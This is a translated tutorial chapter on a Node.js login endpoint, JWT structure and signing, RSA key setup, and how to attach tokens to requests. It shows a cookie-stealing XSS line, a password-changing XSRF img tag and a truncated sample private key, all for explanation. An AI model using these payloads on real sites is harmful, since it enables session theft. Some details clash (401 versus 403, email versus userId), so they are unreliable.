因此，我们不应该在每次需要授权的请求中提供完整的凭据集，而应该实现一个登录端点，让我们的用户只需提供一次密码。在通过登录端点成功认证后，API 将响应某种类型的标识符，客户端可以将该标识符附加到后续请求中，以识别自己。现在让我们实现我们的登录端点，稍后我们将处理这个标识符实际上是什么。

# 编写测试

首先，我们通过编写测试来开始我们的开发。由于登录端点的验证逻辑与我们的端点相同，我们可以直接从其他测试中复制那些场景：

```js
Feature: Login User

  Test that we can create a user using a digest and then perform a login that returns successfully

  Background: Create User with email and password digest

    Given 1 new user is created with random password and email

  Scenario Outline: Bad Client Requests
    ...
  Scenario Outline: Bad Request Payload
    ...
  Scenario Outline: Request Payload with Properties of Unsupported Type
    ...
  Scenario Outline: Request Payload with invalid email format
    ...
  Scenario Outline: Request Payload with invalid digest format
    ...
```

接下来，我们可以指定针对登录端点的特定场景：

```js
  Scenario: Login without supplying credentials
    When the client creates a POST request to /login
    And sends the request
    Then our API should respond with a 400 HTTP status code

  Scenario: Login attaching a well-formed payload

    When the client creates a POST request to /login
    And attaches a valid Login payload
    And sends the request
    Then our API should respond with a 200 HTTP status code
    And the payload of the response should be a string

  Scenario Outline: Login attaching a well-formed payload but invalid credentials

    When the client creates a POST request to /login
    And attaches a Login payload where the <field> field is exactly <value>
    And sends the request
    Then our API should respond with a 403 HTTP status code

    Examples:

    | field  | value                                                        |
    | email  | non@existent.email                                           |
    | digest | $2a$10$enCaroMp4gMvEmvCe4EuP.0d5FZ6yc0yUuSJ0pQTt4EO5MXvonUTm |
```

在第二种场景（`登录附加良好格式化的有效负载`）中，响应体应该是一个标识对象。然而，在我们决定如何实现这个对象之前，我们可以简单地测试是否返回了一个字符串。

# 实现登录功能

如前所述，让我们首先实现登录引擎。像我们的其他引擎一样，我们首先使用验证器来验证请求对象。一旦请求被验证，我们就使用 Elasticsearch 客户端的 `search` 方法来查看有多少用户文档与提供的电子邮件和摘要匹配。如果有非零文档，则表示存在具有这些凭证的用户，引擎应解析为令牌（我们现在使用占位符字符串）。如果没有用户与这些凭证匹配，则表示这些凭证无效，引擎应返回一个拒绝的承诺：

```js
import specialEscape from 'special-escape';

const specialChars = ['+', '-', '=', '&&', '||', '>', '<', '!', '(', ')', '{', '}', '[', ']', '^', '"', '~', '*', '?', ':', '\\', '/'];

function loginUser(req, db, validator, ValidationError) {
  const validationResults = validator(req);
  if (validationResults instanceof ValidationError) {
    return Promise.reject(validationResults);
  }
  return db.search({
    index: process.env.ELASTICSEARCH_INDEX,
    type: 'user',
    q: `(email:${specialEscape(req.body.email, specialChars)}) AND (digest:${specialEscape(req.body.digest, specialChars)})`,
    defaultOperator: 'AND',
  }).then((res) => {
    if (res.hits.total > 0) {
      return 'IDENTIFIER';
    }
    return Promise.reject(new Error('Not Found'));
  });
}

export default loginUser;
```

在 Elasticsearch 中搜索时，有一些字符必须转义。我们使用 `special-escape` npm 包在将电子邮件和 bcrypt 摘要传递给 Elasticsearch 之前对其进行转义。因此，我们必须将此包添加到我们的存储库中：

```js
$ yarn add special-escape
```

接下来，我们转向请求处理器。在 `src/handlers/auth/loginindex.js` 中创建一个新文件，包含以下函数：

```js
function login(req, res, db, engine, validator, ValidationError) {
  return engine(req, db, validator, ValidationError)
    .then((result) => {
      res.status(200);
      res.set('Content-Type', 'text/plain');
      return res.send(result);
    })
    .catch((err) => {
      res.set('Content-Type', 'application/json');
      if (err instanceof ValidationError) {
        res.status(400);
        return res.json({ message: err.message });
      }
      if (err.message === 'Not Found') {
        res.status(401);
        return res.json({ message: 'There are no records of an user with this email and password combination' });
      }
      res.status(500);
      return res.json({ message: 'Internal Server Error' });
    });
}

export default login;
```

然后，我们需要为登录端点的有效负载定义一个验证器。幸运的是，对于我们的情况，登录有效负载的结构与创建用户有效负载相同，因此我们可以简单地重用创建用户的验证器。然而，为了明确起见，让我们在 `src/validators/auth/login.js` 中创建一个包含以下两行的文件：

```js
import validate from '../users/create';
export default validate;
```

最后，在 `src/index.js` 中导入处理器、引擎和验证器，并定义一个新的路由：

```js
import loginValidator from './validators/auth/login';
import loginHandler from './handlers/auth/login';
import loginEngine from './engines/auth/login';
const handlerToEngineMap = new Map([
  [loginHandler, loginEngine],
  ...
]);
const handlerToValidatorMap = new Map([
  [loginHandler, loginValidator],
]);
app.post('/login', injectHandlerDependencies(
  loginHandler, client, handlerToEngineMap, handlerToValidatorMap, ValidationError,
));
```

现在，再次运行端到端测试，它们应该显示为绿色。

# 保持用户认证

现在既然我们的 API 服务器可以认证用户，我们应该返回什么标识符给客户端，以便他们可以在后续请求中附加它？通常有两种类型的标识符：

+   **会话 ID**：在客户端成功认证后，服务器为该客户端分配一个会话 ID，将会话 ID 存储在数据库中，并将其返回给客户端。这个会话 ID 只是一个长随机生成的文本，用于识别用户的会话。当客户端发送请求并提供会话 ID 时，服务器在其数据库中搜索具有该 **会话** 的用户，并假设客户端是该会话 ID 相关的用户。这个想法是，因为字符串足够长且随机，没有人能够猜出一个有效的会话 ID，而且它足够长，以至于不太可能有人能够复制该会话 ID。

+   **声明（令牌）**：客户端成功验证后，服务器检索可以识别用户的信息（例如，他们的 ID、用户名或电子邮件）。如果系统还支持不同的权限级别（例如，编辑个人资料和删除个人资料）或角色（如管理员、版主和用户），这些信息也应被检索。

    所有这些信息，称为**声明**（或**声明集**，如果有多于一个），被格式化为标准格式，并使用密钥进行签名，生成**令牌**。然后，该令牌被发送回客户端，客户端将其附加到每个需要身份验证的请求上。当服务器收到带有令牌的请求时，它将使用密钥验证该令牌是否来自 API 服务器且未被篡改。一旦令牌被验证，服务器就可以信任令牌所呈现的声明。

我们将使用令牌而不是会话 ID，以下是一些原因：

+   **无状态**：使用会话 ID 时，服务器仍然需要执行数据库读取操作，以确定用户的身份和权限级别，以及会话是否已过期。使用令牌时，所有信息都包含在令牌的声明中；服务器无需在任何地方存储令牌，并且可以在不与数据库交互的情况下进行验证。

+   **降低服务器负载**：作为无状态的扩展，服务器将节省大量本应用于数据库读取的内存和 CPU 周期。此外，如果用户希望注销会话，他们只需删除令牌即可。服务器无需采取任何操作。

+   **可扩展性**：在使用基于会话的身份验证时，如果用户在一台服务器上登录，该服务器上数据库中保存的会话 ID 可能无法快速复制，因此如果后续请求被路由到另一台服务器，该服务器将无法验证该用户。但是，由于令牌是自包含的，它们包含了识别和验证用户所需的所有信息。用户可以在任何拥有解密密钥的服务器上进行验证。

+   **信息丰富**：令牌可以携带比会话 ID 多得多的信息。使用会话 ID 时，服务器需要读取数据库，并可能处理用户数据，以确定是否应该执行请求。

+   **可移植/可转让**：任何拥有令牌的实体都有权执行令牌允许的操作，并且令牌可以自由地从一方传递到另一方。当用户希望授予第三方平台对其账户的有限访问权限时，这很有用。没有令牌，他们必须将他们的 ID 和密码提供给第三方，并希望他们不会做任何恶意的事情。使用令牌时，用户一旦经过身份验证，就可以请求一个具有特定权限集的令牌，然后将其发送给第三方。现在，第三方可以执行它所说的操作，而无需知道用户的实际凭据。

+   **更安全**：会话 ID 的安全性取决于其实现。如果会话 ID 可以轻松猜测（例如，它是一个简单的增量计数器），那么恶意方可以猜测会话 ID 并劫持合法用户的会话。使用令牌时，恶意方必须知道用于签名字令牌的密钥才能创建一个有效的令牌。

因此，使用令牌作为传达用户身份验证信息的方式是首选的。但由于令牌只是使用密钥签名的特定格式的声明集合，因此有许多标准可供选择。幸运的是，**JSON 网络令牌**（**JWTs**，发音为“jots”）已成为令牌的*事实标准*，因此选择变得不言而喻。它们也在 RFC7519 中正式定义（[tools.ietf.org/html/rfc751](https://tools.ietf.org/html/rfc751)）。在本项目中，我们将使用 JWTs 作为表示声明的格式。

# JSON 网络令牌 (JWTs)

通常，令牌是由服务器颁发的一个字符串，允许令牌所有者在一定时间内对服务器执行特定操作。JWT 是一种令牌标准，可以在*空间受限的环境中*“*安全*”地传递*声明*。

# JWT 的结构

JWT 由三个部分组成，由点（`.`）分隔：

```js
<header>.<payload>.<signature>
```

+   **头部**：一个包含有关令牌信息的 JSON 对象，例如其类型和用于生成签名的算法，例如，`{ "alg": "HS512", "typ": "JWT" }`。

+   **载荷**：一个包含一组声明的 JSON 对象，例如其身份和权限，例如，`{ "sub": "e@ma.il" }`。

+   **签名**：一个字符串，可以是**消息认证码**（**MAC**）或**数字签名**。签名的作用是确保载荷的*真实性*和*完整性*。

然后，将头部和载荷进行 base-64 编码以确保它们紧凑。一个简单的 JWT 可能看起来像这样（为了可读性，已插入换行符）：

```js
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiJlQG1hLmlsIn0
.
m5ZdZVXkUvur6kYndOAtp3nFdhGSqiK5S13s53y0N5EJukYE1pWdaSOY_a3lZEOsDSJ5xsUw5ACxG8VyCWUleQ
```

当头部和载荷被 base-64 解密时，它们的信息再次被揭示：

```js
{ "alg": "HS512", "typ": "JWT" }  # Header
{ "sub": "e@ma.il" }              # Payload
```

由于 JWT 是 base-64 编码的，因此它们是 URL 安全的。这意味着 JWT 可以通过 URL、HTTP 请求体或 HTTP `Authorization` 头部中的值提供。

现在，让我们更详细地检查 JWT 的每个部分，从头部开始。

# 头部

**JavaScript 对象签名和加密**（**JOSE**）头是一个 JSON 对象，它提供了有关令牌类型、构建方法和任何元数据的信息。JOSE 头的键具有特殊含义：

+   `typ`: JWT 的媒体类型。建议使用值`"JWT"`。

+   `cty`: JWT 的内容类型。此头信息仅在嵌套 JWT 的情况下使用，其值必须是`"JWT"`，以指示最外层 JWT 的内容也是 JWT。

+   `alg`: 生成签名所使用的算法。

根据 JWT 是**JSON Web Signature**（**JWS**）还是**JSON Web Encryption**（**JWE**），还有其他一些可用的头信息。您可以在[iana.org/assignments/jose/jose.xhtml](http://www.iana.org/assignments/jose/jose.xhtml)找到完整的头信息列表。

# 有效载荷和声明

JWT 的有效载荷由一个或多个声明组成。JWT 中有三类声明：已注册的、公共的和私有的。

# 已注册的声明名称

**已注册的声明名称**是具有特殊含义的保留声明名称。它们在 JWT 规范中定义，可以在**互联网数字分配机构**（**IANA**）的*JSON Web Token Claims*注册表中找到。尽管这些名称是保留的，并且具有特殊含义，但服务器处理这些声明的方式完全由服务器本身决定。所有已注册的声明都是可选的：

+   `iss`: 发行者：发行 JWT 的主要实体。在我们的例子中，这可能像`hobnob`一样。

+   `sub`: 主题：声明适用的实体。在我们的例子中，这可能是指用户的电子邮件或 ID。

+   `aud`: 受众：所有打算处理 JWT 的主要实体列表。如果处理声明的主体在存在此声明时没有使用`aud`声明中的值来识别自己，则 JWT*必须*被拒绝。

+   `exp`: 过期时间：JWT 必须被视为无效的时间，以 UNIX 时间戳（秒）表示。然而，服务器可能提供一些宽容（最多几分钟），以应对服务器时钟未同步的情况。

+   `nbf`: 不早于：JWT 必须被视为无效的时间，以 UNIX 时间戳（秒）表示。

+   `iat`: 发行时间：JWT 发行的时间，以 UNIX 时间戳（秒）表示。

+   `jti`: JWT ID：JWT 的唯一标识符。如果 JWT 打算用作**nonce**（即一次性令牌），则可以使用它来防止重放攻击。它也可以用来撤销令牌。

声明名称很短，以最大限度地减少 JWT 的整体大小，因为 JWT 需要包含在需要身份验证/授权的每个请求中。

# 公共声明名称

只要它们不与已注册的声明名称冲突，任何人都可以定义自己的声明名称。如果已经采取了合理的预防措施以确保名称不会与其他声明名称冲突，这些声明名称可以称为**公共声明名称**。这些预防措施可能包括使用发行者控制的命名空间，例如域名。

# 私有声明名称

**私有声明名称**是生产者和 JWT 消费者之间达成协议的用户定义的声明名称。没有努力去防止命名冲突，因此应谨慎使用私有声明名称。

# 示例声明

例如，如果我们的服务器希望授予用户`e@ma.il`在一天内（2017 年 10 月 25 日）删除其个人资料的权限，那么我们可以发行一个 JWT，其有效载荷看起来像这样：

```js
{
  "jti": "a8f0c4e8e",
  "iss": "hobnob.social",
  "sub": "e@ma.il",
  "nbf": 1508886000,
  "exp": 1508972400,
  "iat": 1508274036,
  "social.hobnob.permissions": {
    "profile": {
      "delete": ["e@ma.il"]
    }
  }
}
```

`iss`、`sub`和`aud`声明必须是`StringOrURI`类型。这意味着它们可以是任何任意字符串，但如果它们包含冒号（`:`），则必须是有效的 URI。

# 签名

一旦我们在令牌内部写下了声明或断言的列表，我们必须对其进行签名。这是因为任何人都可以创建包含这些声明的令牌，甚至可以创建包含不同声明的令牌！我们不希望认可这些令牌；我们只想认可由我们自己的服务器生成的（是**真实的**）且未被篡改的（具有**完整性**）令牌。我们可以通过首先将 JWS 签名附加到令牌上，然后在处理令牌时验证它来实现这一点。

**数字签名**与**JWS 签名**不同，因为 JWS 签名还可以包括消息认证码（MAC）。当谈论 JWT 时，“签名”或“签名令牌”通常指的是 JWS 签名，而不是特定的数字签名。

用于签名令牌的支持算法在**JSON Web 算法**（**JWA**）规范中定义。通常，用于签名令牌的算法有两种类型：

+   **非对称地**，使用一对**公钥/私钥**（例如，**RS256**、**RS384**和**RS512**）

+   **对称地**，使用**密钥**（例如，**HS256**、**HS384**和**HS512**）

无论选择哪种算法，首先将 base-64 编码的头部和有效载荷连接在一起，由一个点（`.`）分隔。然后将这个组合字符串（`[base64Header].[base64Payload]`）传递到算法中，以生成 JWS 签名：

```js
const header = {
  alg: [algorithm],
  typ: "JWT"
}

const payload = {
  admin: true
}

const base64Header = btoa(header);
const base64Payload = btoa(payload);

const jwsSignature = alg(`${base64Header}.${base64Payload}`, [k])
```

在这里，`k`是该算法所需的密钥或私钥。这**总是**被保留为私有的。

然后，将此 JWS 签名连接到头部/有效载荷的末尾，以生成完整的 JWT，其格式为`[base64Header].[base64Payload].[base64JwsSignature]`。

当我们的服务器接收到这个 JWT 时，它将从头部和负载值以及密钥中重新生成一个新的 JWS 签名，并将其与附加到令牌上的签名进行比较。如果匹配，那么我们的服务器可以确信产生令牌的人有权访问我们的密钥。由于我们的密钥是保密的，因此我们的服务器可以确信我们就是发行令牌的人，并且可以信任令牌中做出的声明。然而，如果存在不匹配，这意味着令牌要么是用不同的密钥签名的，要么已被篡改，因此不应被信任。

现在，我们理解了*为什么*我们需要签名令牌（以确保真实性和完整性），那么让我们看看两种签名算法之间的区别。

# 非对称签名生成

非对称签名生成利用一对数学上相关的公钥和私钥。它们是相关的，以至于由一个密钥加密的信息只能使用另一个密钥解密。

在 JWT 的上下文中，您可以使用私钥加密头部/声明集以生成一个*数字签名*，然后将它附加到 base-64 编码的头部/声明集上，以生成完整的 JWT。我们还会使公钥公开，以便 JWT 的消费者可以解密它。

由于公钥可以公开共享，因此 JWT 的发行者（生成 JWT）和令牌的消费者（验证它）可以是不同的实体，因为它们不需要共享相同的密钥。

非对称签名生成算法的例子包括以下：

+   使用 SHA 哈希算法的**Rivest–Shamir–Adleman**（**RSA**）系列，包括 RS256、RS384 和 RS512

+   **椭圆曲线数字签名算法**（**ECDSA**）使用**P-256/P-384/P-521**曲线和 SHA 哈希算法，包括**ES256**、**ES384**和**ES512**

# 对称签名生成

使用对称签名生成算法时，JWT 的生成和验证都需要相同的*密钥*。类似于之前，我们将 base-64 编码的头部/声明集与密钥一起传递给算法，并生成一个**消息认证码**（**MAC**）。MAC 附加到声明集和头部，以生成完整的 JWT。

对称签名生成算法的例子包括使用 SHA 哈希算法的*密钥散列消息认证码（HMAC**），包括 HS256、HS384 和 HS512。

# 选择算法

如果我们的令牌打算被第三方读取，那么使用非对称签名生成算法是有意义的。这是因为，除了提供真实性和完整性之外，非对称签名生成还提供了**不可否认性**的特性，即 JWT 的发行者不能否认（或拒绝）他们发行了令牌。

使用非对称签名，只有我们的服务器才能访问私钥；这为 JWT 的消费者提供了信心，即令牌是由我们的服务器签发的，而不是其他人。如果我们改用对称签名生成，我们必须安全地与第三方消费者共享密钥，以便他们可以解密令牌。但这也意味着第三方可以使用该密钥生成更多令牌。因此，那些 JWT 的消费者将无法确信令牌的真实发行者：

| 密码学原语 | 完整性 | 认证 | 不可抵赖性 | 所需密钥 |
| --- | --- | --- | --- | --- |
| 哈希 | 是 | 否 | 否 | 无 |
| 数字签名 | 是 | 是 | 是 | 非对称密钥 |
| MAC | 是 | 是 | 否 | 共享对称密钥 |

然而，在我们的用例中，JWT 的生产者和消费者是同一实体（我们的 API 服务器）；因此，两种类型的算法都可以使用。

MAC 的生成比数字签名计算上更容易，MAC 的密钥长度也更小；然而，由于非对称签名生成提供了更多的灵活性，如果我们可能希望允许第三方解密我们的令牌，我们将选择非对称算法。

从技术上讲，ES512 将是理想的选择，因为我们可以在保持相同安全级别的同时使用更短的关键字。正因为如此，ECDSA 在计算资源上比 RSA 使用更少：

| 对称密钥长度（AES） | 标准非对称密钥长度（RSA） | 椭圆曲线密钥长度（ECDSA） |
| --- | --- | --- |
| 80 | 1024 | 160 |
| 112 | 2048 | 224 |
| 128 | 3072 | 256 |
| 192 | 7680 | 384 |
| 256 | 15360 | 512 |

然而，由于 ECDSA 仍然是一套相对较新的算法，它不像 RSA 这样的更成熟的算法那样得到工具的广泛支持。因此，我们将使用 4096 位长度的 RSA。

# 关于加密的说明

目前，头部和有效载荷仅使用 base-64 编码，这意味着任何人都可以解码它们并读取其内容。这也意味着，如果我们将在有效载荷中包含任何敏感信息，任何人都可以读取它。理想情况下，我们应该确保 JWT 尽可能携带最少的敏感信息，仅足够 JWT 的消费者识别并授予用户权限。对于我们的用例，我们将在有效载荷中仅包含用户 ID，这无论如何都将被视为公开信息，因此加密我们的令牌并不带来太多价值。

然而，重要的是要理解 JWT 可以被加密。

# 术语和总结

前面的章节介绍了很多新术语，可能会让人感到不知所措。因此，在我们继续前进之前，让我们快速回顾并扩展一些使用的术语。

*声明* 由一个 *声明名称* 和 *声明值* 的键值对组成。一组表示为 JSON 对象的声明是一个 *声明集*；声明集中的单个声明也可以称为声明集的 *成员*。

*JSON Web Token*（JWT）是一个字符串，它包括*JOSE 头部*和声明集，并已签名（可选）加密。

要生成签名，服务器必须使用**JSON Web 算法**（**JWA**）规范中指定的算法对头部和声明集进行签名，该规范使用**JSON Web 密钥**（**JWK**）规范中定义的加密密钥。头部、声明集和签名的组合成为**JSON Web 签名**（**JWS**）。

然而，声明集可以被 base64 解码成明文，因此令牌的内容不是私密的。因此，我们可以使用 JWA 规范中定义的另一个算法来加密我们的声明集和 JOSE 头部，以确保敏感数据保持私密。这个加密的 JWT 然后是一个**JSON Web 加密**（**JWE**）。

JWS 和 JWE 是 JWT 的两种不同表示形式。换句话说，JWT 可能有两种风味。换句话说，JWT 必须符合 JWS 或 JWE 规范。为了认证目的，通常的流程是对声明集进行签名以生成 JWS，然后加密生成的 JWS 以生成 JWE。JWS 被称为嵌套在 JWE 结构中。

一个既未签名也未加密的 JWT 被称为不安全。

# 返回令牌

现在我们知道了 JWT 是如何工作的，让我们开始实现 JWT，首先在用户首次成功认证时返回一个 JWT。对于我们的简单用例，它不需要不同的权限级别，我们只需在负载中包含一个单一的`sub`声明，并将其值设置为用户的电子邮件。

# 添加端到端测试

要开始，我们将简单地测试我们的`POST /login`端点返回一个包含用户电子邮件作为负载的 JWT。在`Login attaching a well-formed payload`场景的末尾，添加以下步骤：

```js
And the response string should satisfy the regular expression /^[\w-]+\.[\w-]+\.[\w-.+\/=]*$/
And the JWT payload should have a claim with name sub equal to context.userId
```

第二步（`JWT 的有效负载应该有一个名为 sub 的声明，其值等于 context.email`）未定义。要实现它，我们必须将令牌分成三部分，即头部、负载和签名；对 JWT 负载进行 base64 解码；然后检查其`sub`属性是否等于预期的用户 ID。然而，我们不必自己实现这个逻辑，我们可以简单地使用`jsonwebtoken`包。因此，让我们将其添加为一个正常依赖项，因为我们还需要它来实现代码：

```js
$ yarn add jsonwebtoken
```

然后，在`spec/cucumber/steps/response.js`中添加以下步骤定义：

```js
import assert, { AssertionError } from 'assert';
import { decode } from 'jsonwebtoken';

Then(/^the JWT payload should have a claim with name (\w+) equal to context.([\w-]+)$/, function (claimName, contextPath) {
 const decodedTokenPayload = decode(this.responsePayload);
 if (decodedTokenPayload === null) {
 throw new AssertionError();
 }
 assert.equal(decodedTokenPayload[claimName], objectPath.get(this, contextPath));
});
```

运行测试，这两个步骤应该失败。

# 实现

如前所述，我们将使用 RSA 算法来生成 JWT 的签名，这需要生成私钥和公钥。因此，我们必须做的第一件事是生成密钥对。我们可以使用`ssh-keygen`命令在本地执行此操作：

```js
$ mkdir keys && ssh-keygen -t rsa -b 4096 -f ./keys/key
```

在这里，我们使用 `-t` 标志来指定我们想要生成 RSA 密钥对，并使用 `-b` 标志来指定位大小为 4,096 的密钥。最后，我们使用 `-f` 标志来指定密钥要存储的位置。这将生成一个类似这样的私钥（为了简洁而截断）：

```js
-----BEGIN RSA PRIVATE KEY-----
MIIJKAIBAAKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee
1WjbKLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRT
...
...
/cH3z0iGJh6WPrrw/xhil4VQ7UUSrD/4GC64r1sFS9wZ6d+PHPtcmlbkbWVQb/it
2goH/g6WLIKABZNz2uWxmEnT7wOO+++tIPL8q4u1p9pabuO8tsgHX4Tl6O4=
-----END RSA PRIVATE KEY-----
```

它还将生成一个类似这样的公钥（为了简洁而截断）：

```js
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA....7j7CyQ== username@hostname
```

然而，`jsonwebtoken` 包期望我们的 RSA 密钥是 PEM 编码的，因此我们必须执行一个额外的步骤来将公钥导出为编码的 PEM 文件：

```js
$ ssh-keygen -f ./keys/key.pub -e -m pem > ./keys/key.pub.pem
```

这将生成一个类似以下密钥（为了简洁而截断）：

```js
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee1Wjb
KLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRTPxSO
...
XjxHHzaebcsy1ccp3cUHP2/3WOAz35x1UdFvYwQ/Qjh9Ud1Yoe4+wskCAwEAAQ==
-----END RSA PUBLIC KEY-----
```

现在，我们不想将这些密钥文件提交到我们仓库的历史记录中，有以下几个原因：

+   任何有权访问仓库的人都可以获取密钥的副本（最重要的是私钥），并能够冒充真实的服务器。私钥应该尽可能少的人知道；甚至开发者也不需要知道生产密钥。唯一需要知道的人是管理服务器的系统管理员。

+   如果我们的密钥硬编码在代码中，那么如果我们想要更改这些密钥，我们就必须更新代码，提交到仓库，并重新部署整个应用程序。

那么，更好的替代方案是什么？

最安全的替代方案是使用 **可信平台模块**（**TPM**），这是一个嵌入到服务器主板上的微控制器（一个计算机芯片），允许你安全地存储加密密钥。如果你加密了你的开发机器，用于加密和解密机器的密钥存储在 TPM 中。同样，你可以使用 **硬件安全模块**（**HSM**），它与 TPM 类似，但不是嵌入到主板中，而是一个可拆卸的外部设备。

然而，使用 TPM 和 HSM 对于大多数云服务器来说不是一个可行的选项。因此，最好的选择是将密钥作为环境变量存储。然而，我们的密钥跨越多行；我们如何定义多行环境变量？

# 多行环境变量

目前，我们在运行应用程序时使用 `dotenv-cli` 包来加载我们的环境变量，它支持多行变量，只要你在双引号 (`"`) 中包含变量，并用 `\n` 替换换行符。因此，我们可以通过将以下条目（为了简洁而截断）添加到我们的 `.env`、`.env.example`、`test.env` 和 `test.env.example` 文件中来定义我们的密钥：

```js
PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----\nMIIJKAIBAAKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee\n1WjbKLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRT\nPxSOtzy........tsgHX4Tl6O4=\n-----END RSA PRIVATE KEY-----"
PUBLIC_KEY="-----BEGIN RSA PUBLIC KEY-----\nMIICCgKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee1Wjb\nKLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRTPxSO\ntzydJxN........+wskCAwEAAQ==\n-----END RSA PUBLIC KEY-----"
```

# 生成令牌

然后，在 `src/index.js` 中，从 `jsonwebtoken` 包中导入 `sign` 方法，并通过处理程序将其传递给引擎。然后，更新引擎函数，当找到具有这些凭证的用户时，返回已签名的 JWT。请注意，我们正在使用存储在 `process.env.PRIVATE_KEY` 中的私钥来签名令牌：

```js
function loginUser(req, db, validator, ValidationError, sign) {
  ...
  return client.search( ... )
    .then((res) => {
      if (res.hits.total > 0) {
 const payload = { sub: res.hits.hits[0]._id };
 const options = { algorithm: 'RS512' };
 const token = sign(payload, process.env.PRIVATE_KEY, options);
 return token;
      }
      return Promise.reject(new Error('Not Found'));
    });
}
```

现在，再次运行我们的测试，它们应该都会通过。

# 附加令牌

我们现在正在向客户端提供一个他们可以用作电子邮件/密码的令牌，但他们应该如何将其附加到后续请求中？一般来说，有五种方法可以将信息附加到 HTTP 请求中：

+   作为 URL 参数

+   作为查询字符串

+   在请求体内部

+   作为 HTTP Cookie

+   作为头字段

URL 参数用于路由，将其附加到摘要没有意义。查询字符串用于与查询相关的事物，例如设置 `limit` 以限制搜索端点返回的结果数量；将信息附加到与查询无关的地方也没有意义。至于请求体；我们并不总是可以在请求体中包含摘要，因为一些端点，如更新个人资料，使用请求体来携带有效负载。这使我们只剩下使用 Cookie 或头字段。

# HTTP Cookie

一个 HTTP Cookie（如网页 Cookie 或浏览器 Cookie）是一个服务器可以发送到客户端的非常简单的字典/键值存储。它是通过 `Set-Cookie` 头由服务器发送的。例如，一个 `Set-Cookie` 头可能看起来像这样：

```js
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Expires=<date>
```

可以在同一个响应消息中发送多个 `Set-Cookie` 头，以组成键值存储。

Cookie 的特别之处在于，大多数浏览器客户端都会在后续请求中自动将这个键值存储发送回去，这次是在 `Cookie` 头内部：

```js
Cookie: name1=value1; name2=value2
```

因此，如果我们使用 Cookie 在浏览器中存储用户的会话 ID，它将允许服务器确定请求是否来自同一客户端，因为 Cookie 中将包含相同的会话 ID。

Cookie 的 `Domain` 指令决定了客户端将为哪个域名（或子域名）设置 `Cookie` 头。例如，由 `abc.xyz` 设置的 Cookie 只会在客户端向 `abc.xyz` 发送请求时返回，而不会在请求将发送到 `foo.bar` 时返回。

虽然 Cookie 听起来是个好主意，但使用 Cookie 有很多缺点，尤其是在处理跨域和 CORS 的情况下。因为 Cookie 只适用于该域名（或其子域名），如果相关服务位于不同的域名下，它们将无法进行身份验证。例如，当我们的平台从简单的用户目录（部署在 `hobnob.social`）扩展到，比如说，一个活动组织应用（`hobnob.events`），并且我们希望让已经登录到 `hobnob.social` 的用户也能自动登录到 `hobnob.events`；由于 Cookie 是由不同域名设置的，这无法通过 Cookie 实现。

对于浏览器来说，Cookie 更加方便；对于非浏览器客户端来说，管理 Cookie 则更加麻烦。

此外，Cookie 也容易受到 **跨站脚本**（**XSS**）和 **跨站请求伪造**（**XSRF**）攻击。

# 跨站脚本（XSS）

跨站脚本（XSS）是指恶意方将一些 JavaScript 注入由服务器提供的页面中。例如，如果服务器没有对评论进行清理，那么恶意方可以写入以下评论：

```js
document.write('<img src="img/collect.gif?cookie=' + document.cookie + '" />')
```

`document.cookie` 是一个全局属性，包含为当前域名设置的所有的 cookie。因此，当下一个访问者访问您的网站时，他们将输出 `document.cookie` 的值，并将其作为查询字符串发送到 `some.malicious.endpoint`。一旦恶意方从访问者的 cookie 中获取到会话 ID 或令牌，他们就能冒充该用户。

# 跨站请求伪造（XSRF）

在 XSRF 的情况下，恶意方将尝试在受害者不知情的情况下向目标应用程序发送请求。例如，恶意方可能有一个位于 `malicious.com` 的网站，并包含以下定义的 `img` 标签：

```js
<img src="img/?newPassword=foobar">
```

现在，当受害者访问 `malicious.com` 时，他们的浏览器将向 `http://target.app/change-password/?newPassword=foobar` 发送一个 `GET` 请求，并附带该域的任何 cookie。因此，如果用户已经在另一个浏览器标签中进行了认证，那么这个 `GET` 请求就会像是由用户发起的一样被接收。

跨站脚本（XSS）是 OWASP 基金会十大应用安全风险之一。您可以在 OWASP 网站上了解更多关于 XSS 的信息([owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS))). 类似地，XSRF 在 OWASP 上也有一个页面([owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))).

# HTTP 头部

由于使用 cookie 的安全性较低，尤其是对于浏览器客户端，并且因为它需要我们做更多的工作来保护我们的 API，所以我们不应该存储和发送我们的令牌使用 cookie。相反，我们应该使用现代 Web 存储 API（`sessionStorage` 或 `localStorage`）来存储令牌，并使用 HTTP 头部字段将其发送回来。

# 授权头部

那么，我们应该使用哪个 HTTP 头部呢？常见的做法是使用 `Authorization` 头部，其语法如下：

```js
Authorization: <type> <credentials>
```

`type` 是 **认证类型**，而 `credentials` 是用户凭证的表示。支持许多类型的认证方案，例如 `Basic`、`Bearer`、`Digest`、`Negotiate` 和 `OAuth`，以及更多。最常见的是 `Basic` 和 `Bearer`。

**互联网数字分配机构**（**IANA**）在其注册表中维护一份有效的认证方案列表，该注册表位于[iana.org/assignments/http-authschemes/http-authschemes.xhtml](http://www.iana.org/assignments/http-authschemes/http-authschemes.xhtml)。

`Basic` 方案将凭证作为冒号分隔的用户名/密码对发送（例如，`username:password`），这些凭证是 Base64 编码的。它也是最原始和不安全的认证方案，因为用户名和密码以明文形式传输。

相反，我们将使用 `Bearer` 方案，其中凭证是令牌本身：

```js
Authorization: Bearer eyJhbGciOiJSUzUxMiIsInR5cCI6I...2ufQdDkg
```

# 编写测试
